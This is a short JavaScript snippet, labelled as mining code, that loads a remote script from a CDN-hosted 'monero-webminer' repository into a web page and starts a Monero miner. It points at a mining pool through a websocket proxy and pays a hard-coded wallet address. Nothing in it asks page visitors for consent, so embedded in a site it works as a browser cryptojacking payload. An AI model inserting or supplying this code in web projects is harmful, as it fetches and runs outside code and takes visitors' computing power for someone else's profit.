// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://ny1.xmrminingproxy.com";
    var pool = "gulf.moneroocean.stream:10128";
    var walletAddress = "88zds4LCv8T8yZUshwnkcpfGcYpVUpJAMNdxMZ4wfK3NMwD7znk5f1wfDUJB5skH3STGkaoPkdvmn21rxSrRCn8xQ1ncfXo";
    var workerId = "webminer"
    var threads = -4;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
